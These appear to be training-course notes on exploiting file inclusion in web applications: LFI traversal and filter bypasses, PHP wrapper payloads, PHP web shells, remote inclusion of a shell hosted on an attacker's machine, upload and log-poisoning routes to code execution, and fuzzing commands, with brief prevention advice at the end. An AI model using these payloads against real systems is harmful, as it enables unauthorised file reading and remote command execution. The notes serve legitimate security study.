# File Inclusion
## Intro

The most common place usually find LFI is templating engine. 

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

## File Disclosure

### LFI

`/index.php?language=es.php` to `index.php?language=<anything>`

#### Basic LFI

If the web application is indeed pulling a file that is now being included in the page, we may be able to change the file being pulled to read the content of a different local file

**Example**: `/index.php?language=/etc/passwd`

Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows

#### File Traversal

Web developers may append or prepend a string to the parameter. We can easily bypass this restriction by traversing directories using `relative paths`. To do so, we can add `../` before our file name, which refers to the parent directory

**Example**: `/index.php?language=../../etc/passwd`
- Filename prefix
	- We can prefix a `/` before payload and this should consider the determined prefix as a directory, and then we should bypass the filename and be able to traverse directories
	- **Example**: `/index.php?language=/../../../etc/passwd`
- Appended extensions (next section)
- Second-Order Attack
	- Many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters. 
	- Example: `/profile/$username/avatar.png` with malicious LFI username (e.g. `../../../etc/passwd`)
	- We would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack

Exercise #2: `/../../../../usr/share/flags/flag.txt`

### Basic Bypass

- Non-Recursive Path Traversal Filters
	- `$language = str_replace('../', '', $_GET['language']);`
	- If we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal
- Encoding
	- If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`
- Approved Paths
	- For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory
	- To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify
	- Example: `/index.php?language=./languages/../../../../etc/passwd`

#### Appended Extension

- Path Truncation
	- In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`and any characters after the maximum length will be ignored. PHP also used to:
		- Remove trailing slashes and single dots in path names (e.g. `/etc/passwd/.`)
		- Disregard multiple slashes in the path (e.g. `////etc/passwd`)
		- Disregard current directory shortcut (`.`) in the middle of the path.  (e.g. `/etc/./passwd`)
		- If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Automate the creation of long string
			- `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`
	- Null Bytes (PHP <5.5)
		- Vulnerable to `null byte injection`. Adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it due to how strings stored in low-level memory.
		- We can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`). Anything after the null byte would be truncated

**Exercise**: `?language=languages/....//....//....//....//flag.txt`

### PHP Filters

If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution. 

#### Input Filters

Pass different types of input and have it filtered (`php://filter/`). The main ones we require for our attack are `resource` and `read`.
- `resource`: specify the stream we would like to apply the filter on (e.g. a local file)
- `read`: apply different filters on the input resource
	-  [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
	- the filter that is useful for LFI attacks is the `convert.base64-encode` filter under `Conversion Filters`

#### Fuzzing for PHP Files

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

**Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well

#### Standard PHP Inclusion

Sometimes, if we try to include the php file (e.g. `config.php`), we get an empty result in place of our LFI string, since the `config.php` most likely only sets up the web app configuration and does not render any HTML output. This is where the `base64` php filter gets useful, as we can use it to base64 encode the php file.

**Note:** The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.

#### Source Code Disclosure
```url
php://filter/read=convert.base64-encode/resource=config
```

So it will be `/index.php?language=php://filter/read=convert.base64-encode/resource=config`

## RCE

### PHP Wrappers

We can use many methods to execute remote commands:
- enumerating user credentials and SSH keys
- we may find the database password in a file like `config.php`, which may match a user's password in case they re-use the same password
- Or we can check the `.ssh` directory in each user's home directory

#### Data

Data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

To confirm whether the app has this vulnerability, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version, also using the base64 filter.

```sh
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Knowing how to check for the `allow_url_include` option can be very ==important==, as `this option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack

With `allow_url_include` enabled, we can base64 encode a basic PHP web shell. Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`.

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64
```

And attack with payload

```sh
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

#### Input

Input wrapper also can be used to include external input and execute PHP code. But we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

#### Expect

Allows us to directly run commands through URL streams. Works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands. 

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

```
extension=expect
```

To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion

In some cases, we may also be able to include remote files if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
Almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is because:
1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

### Verify RFI
So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. 

 Example: Use `http://127.0.0.1:80/index.php`) as our input string and see if it gets included.

### RCE with RFI
```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Then host the script and include it in:
- HTTP: `sudo python3 -m http.server <LISTENING_PORT>`
	- `?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
- FTP: `sudo python -m pyftpdlib -p 21`
	- `?language=ftp://<OUR_IP>/shell.php&cmd=id` or `?language=ftp://user:pass@localhost/shell.php&cmd=id`
- SMB: `impacket-smbserver -smb2support share $(pwd)`
	- `?language=\\<OUR_IP>\share\shell.php&cmd=whoami`

## LFI & File Uploads

If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution

### Image Upload

Create malicious image
```sh
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Check uploaded file path
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Include the uploaded file in the LFI vulnerable function, and the PHP code should get executed
```html
?language=./profile_images/shell.gif&cmd=id
```

### Zip Upload

Zip PHP shell
```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed..

Include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded)
```html
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload

write the following PHP script into a `shell.php`
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile into .phar file and rename it to .jpg
```sh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt`  (URL encoded) to get the output of the command we specify with (`&cmd=id`)
```html
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Log Poisoning

### PHP Session Poisoning

Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in 
- `/var/lib/php/sessions/` on Linux
- `C:\Windows\Temp\` on Windows.

Check PHPSESSID, then check `/var/lib/php/sessions/sess_<value>`

1. Set the values that's on our control to something, example: `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
2. Include the session file and use the `&cmd=id` to execute commands
	`?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`

Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

### Server Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`

`access.log` file contains various information about all requests made to the server, including each request's User-Agent header.  As we can control the `User-Agent` header in our requests, we can use it to poison the server logs

Once poisoned, include the logs through the LFI vulnerability. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. But sometimes it may be different, and we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

**Tip:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

1. Intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`
2. Use: `?language=/var/log/apache2/access.log`

```sh
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`)

**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

The following are some of the service logs we may be able to read:
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
If we do have access to them, we can try to poison them as we did above. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute.

## Automated & Prevention

### Automated Scanning

#### Fuzz parameters

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

#### LFI wordlists

```sh
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

#### Fuzz Server Webroot

 If we wanted to locate a file we uploaded, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.
 
Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

#### Server Logs/Configurations

If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first
```sh
ffuf -w ./Tools/LFI-WordList-Linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

If there is an apache variable, check it from `../../../../etc/apache2/envvars`

#### LFI Tools

The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy)
Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution.

### Prevention

#### File Inclusion Prevention

1. Avoid passing any user-controlled inputs into any file inclusion functions or APIs.
2. Utilize a limited whitelist of allowed user inputs and match each input to the file to be loaded, while having a default value for all other inputs

### Preventing Directory Traversal

1. Use your programming language's (or framework's) built-in tool to pull only the filename
2. Sanitize the user input to recursively remove any attempts of traversing directories

Recursively remove `../` sub-strings

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

#### Web Server Configuration

1. We should globally disable the inclusion of remote files. In PHP this can be done by setting allow_url_fopen and allow_url_include to Off
2. Lock web applications to their web root directory by:
	1. Running the application within Docker
	2. Adding `open_basedir = /var/www` in the `php.ini` file
3. ensure that certain potentially dangerous modules are disabled, like [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html)
#### Web Application Firewall (WAF)

ModSecurity

Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend.